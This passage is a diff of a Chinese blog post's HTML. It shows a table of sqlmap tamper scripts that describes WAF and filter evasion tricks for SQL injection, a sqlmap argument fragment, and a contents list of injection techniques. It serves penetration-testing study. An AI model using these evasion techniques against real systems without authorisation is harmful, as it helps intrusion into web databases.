+<td></td>
+</tr>
+<tr>
+<td>17</td>
+<td align="left">escapequotes</td>
+<td>双引号替换为\</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>18</td>
+<td align="left">greatest</td>
+<td>大于号替换为greatest，绕过对&gt;的过滤</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>19</td>
+<td align="left">halfversionedmorekeywords</td>
+<td>在每个关键字前加注释</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>20</td>
+<td align="left">htmlencode</td>
+<td>html编码所有非字母和数字的字符</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>21</td>
+<td align="left">ifnull2casewhenisnull</td>
+<td>改变ifnull语句的写法</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>22</td>
+<td align="left">ifnull2ifisnull</td>
+<td>替换ifnull为if(isnull(A))</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>23</td>
+<td align="left">informationschemacomment</td>
+<td>标示符后添加注释</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>24</td>
+<td align="left">least</td>
+<td>替换大于号为least</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>25</td>
+<td align="left">lowercase</td>
+<td>全部替换为小写值</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>26</td>
+<td align="left">modsecurityversioned</td>
+<td>空格替换为查询版本的注释</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>27</td>
+<td align="left">modsecurityzeroversioned</td>
+<td>添加完整的查询版本的注释</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>28</td>
+<td align="left">multiplespaces</td>
+<td>添加多个空格</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>29</td>
+<td align="left">nonrecursivereplacement</td>
+<td>替换预定义的关键字</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>30</td>
+<td align="left">overlongutf8</td>
+<td>将所有字符转义为utf8</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>31</td>
+<td align="left">overlongutf8more</td>
+<td>以指定的payload转换所有字符</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>32</td>
+<td align="left">percentage</td>
+<td>每个字符前添加%</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>33</td>
+<td align="left">plus2concat</td>
+<td>将加号替换为concat函数</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>34</td>
+<td align="left">plus2fnconcat</td>
+<td>将加号替换为ODBC函数{fn CONCAT()}</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>35</td>
+<td align="left">randomcase</td>
+<td>字符大小写随机替换</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>36</td>
+<td align="left">randomcomments</td>
+<td>/**/分割关键字</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>37</td>
+<td align="left">securesphere</td>
+<td>添加某字符串</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>38</td>
+<td align="left">sp_password</td>
+<td>追加sp_password字符串</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>39</td>
+<td align="left">space2comment</td>
+<td>空格替换为/**/</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>40</td>
+<td align="left">space2dash</td>
+<td>空格替换为–加随机字符</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>41</td>
+<td align="left">space2hash</td>
+<td>空格替换为#加随机字符</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>42</td>
+<td align="left">space2morecomment</td>
+<td>空格替换为/<strong>_</strong>/</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>43</td>
+<td align="left">space2morehash</td>
+<td>空格替换为#加随机字符及换行符</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>44</td>
+<td align="left">space2mssqlblank</td>
+<td>空格替换为其他空符号</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>45</td>
+<td align="left">space2mssqlhash</td>
+<td>空格替换为%23%0A</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>46</td>
+<td align="left">space2mysqlblank</td>
+<td>空格替换为其他空白符号</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>47</td>
+<td align="left">space2mysqldash</td>
+<td>空格替换为–%0A</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>48</td>
+<td align="left">space2plus</td>
+<td>空格替换为加号</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>49</td>
+<td align="left">space2randomblank</td>
+<td>空格替换为备选字符集中的随机字符</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>50</td>
+<td align="left">symboliclogical</td>
+<td>AND和OR替换为&amp;&amp;和\</td>
+<td>\</td>
+<td></td>
+</tr>
+<tr>
+<td>51</td>
+<td align="left">unionalltounion</td>
+<td>union all select替换为union select</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>52</td>
+<td align="left">unmagicquotes</td>
+<td>宽字符绕过GPC</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>53</td>
+<td align="left">uppercase</td>
+<td>全部替换为大写值</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>54</td>
+<td align="left">varnish</td>
+<td>添加HTTP头</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>55</td>
+<td align="left">versionedkeywords</td>
+<td>用注释封装每个非函数的关键字</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>56</td>
+<td align="left">versionedmorekeywords</td>
+<td>使用注释绕过</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>57</td>
+<td align="left">xforwardedfor</td>
+<td>添加伪造的HTTP头</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>脚本base64encode.py内容</p>
+<p><img src="/2019/09/01/sql注入的payload/1568725746852.png" alt="1568725746852"></p>
+<p><img src="/2019/09/01/sql注入的payload/1568725721982.png" alt="1568725721982"></p>
+<p><img src="/2019/09/01/sql注入的payload/1568726544006.png" alt="1568726544006"></p>
+<p>   –dbs –base64encode.py  </p>
+<p><img src="/2019/09/01/sql注入的payload/1568728152475.png" alt="1568728152475"></p>
+<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><p><a href="https://www.fuzzer.xyz/2019/03/01/SQL注入回顾篇(四)/#权限常用参数" target="_blank" rel="noopener">SQL注入回顾篇(四)/#权限常用参数</a></p>
+<p><a href="https://anemone.top/sqli-SQL注入总结/" target="_blank" rel="noopener">sqli-SQL注入总结</a></p>
 
       
     </div>
@@ -769,7 +1224,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第一部分：基础"><span class="nav-number">1.</span> <span class="nav-text">第一部分：基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、注入的分类："><span class="nav-number">1.1.</span> <span class="nav-text">1、注入的分类：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于从服务器接收到的响应"><span class="nav-number">1.1.1.</span> <span class="nav-text">基于从服务器接收到的响应</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于如何处理输入的-SQL-查询（数据类型）"><span class="nav-number">1.1.2.</span> <span class="nav-text">基于如何处理输入的 SQL 查询（数据类型）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于程度和顺序的注入-哪里发生了影响"><span class="nav-number">1.1.3.</span> <span class="nav-text">基于程度和顺序的注入(哪里发生了影响)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于注入点的位置上的"><span class="nav-number">1.1.4.</span> <span class="nav-text">基于注入点的位置上的</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、系统函数"><span class="nav-number">1.2.</span> <span class="nav-text">2、系统函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、字符串连接函数"><span class="nav-number">1.3.</span> <span class="nav-text">3、字符串连接函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4、一般用于尝试的语句"><span class="nav-number">1.4.</span> <span class="nav-text">4、一般用于尝试的语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5、union-操作符的介绍"><span class="nav-number">1.5.</span> <span class="nav-text">5、union 操作符的介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-、sql-中的逻辑运算"><span class="nav-number">1.6.</span> <span class="nav-text">6 、sql 中的逻辑运算</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7、-注入流程"><span class="nav-number">1.7.</span> <span class="nav-text">7、 注入流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1-联合查询的类型"><span class="nav-number">2.</span> <span class="nav-text">1 联合查询的类型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-盲注"><span class="nav-number">3.</span> <span class="nav-text">2 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1：-基于布尔-SQL-盲注-构造逻辑判断"><span class="nav-number">3.0.1.</span> <span class="nav-text">1： 基于布尔 SQL 盲注-构造逻辑判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2：-基于报错的-SQL-盲注-构造-payload-让信息通过错误提示回显出来-存疑"><span class="nav-number">3.0.2.</span> <span class="nav-text">2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来  存疑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-基于时间的-SQL-盲注–延时注入"><span class="nav-number">3.0.3.</span> <span class="nav-text">3:基于时间的 SQL 盲注–延时注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#布尔盲注演示"><span class="nav-number">3.0.3.1.</span> <span class="nav-text">布尔盲注演示</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错盲注演示"><span class="nav-number">3.0.3.2.</span> <span class="nav-text">报错盲注演示</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#演示盲注演示"><span class="nav-number">3.0.3.3.</span> <span class="nav-text">演示盲注演示</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-文件的导入导出"><span class="nav-number">3.1.</span> <span class="nav-text">3 文件的导入导出</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、-load-file-导出文件"><span class="nav-number">3.1.0.1.</span> <span class="nav-text">1、 load_file()导出文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、-文件导入到数据库"><span class="nav-number">3.1.0.2.</span> <span class="nav-text">2、 文件导入到数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、-导入到文件"><span class="nav-number">3.1.0.3.</span> <span class="nav-text">3、 导入到文件</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#POST-注入"><span class="nav-number">3.2.</span> <span class="nav-text">POST 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#增删改函数介绍"><span class="nav-number">3.3.</span> <span class="nav-text">增删改函数介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-头部注入"><span class="nav-number">3.4.</span> <span class="nav-text">HTTP 头部注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#User-Agent-注入"><span class="nav-number">3.4.0.0.1.</span> <span class="nav-text">User-Agent 注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Referer-注入"><span class="nav-number">3.4.0.0.2.</span> <span class="nav-text">Referer 注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cookie-注入-报错了"><span class="nav-number">3.4.0.0.3.</span> <span class="nav-text">cookie 注入  报错了</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二部分：高级注入"><span class="nav-number">4.</span> <span class="nav-text">第二部分：高级注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#二次排序"><span class="nav-number">4.0.1.</span> <span class="nav-text">二次排序</span></a></li></ol></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第一部分：获取payload"><span class="nav-number">1.</span> <span class="nav-text">第一部分：获取payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#通过sqlmap-awvs等工具"><span class="nav-number">1.1.</span> <span class="nav-text">通过sqlmap awvs等工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过谷歌"><span class="nav-number">1.2.</span> <span class="nav-text">通过谷歌</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二部分：基础"><span class="nav-number">2.</span> <span class="nav-text">第二部分：基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、注入的分类："><span class="nav-number">2.1.</span> <span class="nav-text">1、注入的分类：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于从服务器接收到的响应"><span class="nav-number">2.1.1.</span> <span class="nav-text">基于从服务器接收到的响应</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#▲基于错误的-SQL-注入"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">▲基于错误的 SQL 注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#▲联合查询的类型"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">▲联合查询的类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#▲堆查询注入"><span class="nav-number">2.1.1.3.</span> <span class="nav-text">▲堆查询注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#▲SQL-盲注"><span class="nav-number">2.1.1.4.</span> <span class="nav-text">▲SQL 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#•基于布尔-SQL-盲注"><span class="nav-number">2.1.1.4.1.</span> <span class="nav-text">•基于布尔 SQL 盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#•基于时间的-SQL-盲注"><span class="nav-number">2.1.1.4.2.</span> <span class="nav-text">•基于时间的 SQL 盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#•基于报错的-SQL-盲注"><span class="nav-number">2.1.1.4.3.</span> <span class="nav-text">•基于报错的 SQL 盲注</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于如何处理输入的-SQL-查询（数据类型）"><span class="nav-number">2.1.2.</span> <span class="nav-text">基于如何处理输入的 SQL 查询（数据类型）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#•基于字符串"><span class="nav-number">2.1.2.0.1.</span> <span class="nav-text">•基于字符串</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#•数字或整数为基础的"><span class="nav-number">2.1.2.0.2.</span> <span class="nav-text">•数字或整数为基础的</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于程度和顺序的注入-哪里发生了影响"><span class="nav-number">2.1.3.</span> <span class="nav-text">基于程度和顺序的注入(哪里发生了影响)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#★一阶注射"><span class="nav-number">2.1.3.0.1.</span> <span class="nav-text">★一阶注射</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基于注入点的位置上的"><span class="nav-number">2.1.4.</span> <span class="nav-text">基于注入点的位置上的</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#▲通过用户输入的表单域的注射。"><span class="nav-number">2.1.4.0.1.</span> <span class="nav-text">▲通过用户输入的表单域的注射。</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#2、系统函数"><span class="nav-number">2.2.</span> <span class="nav-text">2、系统函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、字符串连接函数"><span class="nav-number">2.3.</span> <span class="nav-text">3、字符串连接函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4、一般用于尝试的语句"><span class="nav-number">2.4.</span> <span class="nav-text">4、一般用于尝试的语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5、union-操作符的介绍"><span class="nav-number">2.5.</span> <span class="nav-text">5、union 操作符的介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-、sql-中的逻辑运算"><span class="nav-number">2.6.</span> <span class="nav-text">6 、sql 中的逻辑运算</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7、-注入流程"><span class="nav-number">2.7.</span> <span class="nav-text">7、 注入流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第部分：实验演示"><span class="nav-number">3.</span> <span class="nav-text">第部分：实验演示</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#联合查询的类型"><span class="nav-number">3.1.</span> <span class="nav-text">联合查询的类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#盲注"><span class="nav-number">3.2.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1：-基于布尔-SQL-盲注-构造逻辑判断"><span class="nav-number">3.2.1.</span> <span class="nav-text">1： 基于布尔 SQL 盲注-构造逻辑判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2：-基于报错的-SQL-盲注-构造-payload-让信息通过错误提示回显出来-存疑"><span class="nav-number">3.2.2.</span> <span class="nav-text">2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来  存疑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-基于时间的-SQL-盲注–延时注入"><span class="nav-number">3.2.3.</span> <span class="nav-text">3:基于时间的 SQL 盲注–延时注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#布尔盲注演示"><span class="nav-number">3.2.3.1.</span> <span class="nav-text">布尔盲注演示</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错盲注演示"><span class="nav-number">3.2.3.2.</span> <span class="nav-text">报错盲注演示</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#演示盲注演示"><span class="nav-number">3.2.3.3.</span> <span class="nav-text">演示盲注演示</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件的导入导出"><span class="nav-number">3.3.</span> <span class="nav-text">文件的导入导出</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、-load-file-导出文件"><span class="nav-number">3.3.0.1.</span> <span class="nav-text">1、 load_file()导出文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、-文件导入到数据库"><span class="nav-number">3.3.0.2.</span> <span class="nav-text">2、 文件导入到数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、-导入到文件"><span class="nav-number">3.3.0.3.</span> <span class="nav-text">3、 导入到文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST-注入"><span class="nav-number">3.4.</span> <span class="nav-text">POST 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#增删改函数介绍"><span class="nav-number">3.5.</span> <span class="nav-text">增删改函数介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-头部注入"><span class="nav-number">3.6.</span> <span class="nav-text">HTTP 头部注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#User-Agent-注入"><span class="nav-number">3.6.0.0.1.</span> <span class="nav-text">User-Agent 注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Referer-注入"><span class="nav-number">3.6.0.0.2.</span> <span class="nav-text">Referer 注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cookie-注入-报错了"><span class="nav-number">3.6.0.0.3.</span> <span class="nav-text">cookie 注入  报错了</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二次排序"><span class="nav-number">3.7.</span> <span class="nav-text">二次排序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入"><span class="nav-number">3.8.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#堆叠注入"><span class="nav-number">3.9.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tamper详解"><span class="nav-number">3.10.</span> <span class="nav-text">Tamper详解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料："><span class="nav-number">3.11.</span> <span class="nav-text">参考资料：</span></a></li></div>
             
 
           </div>
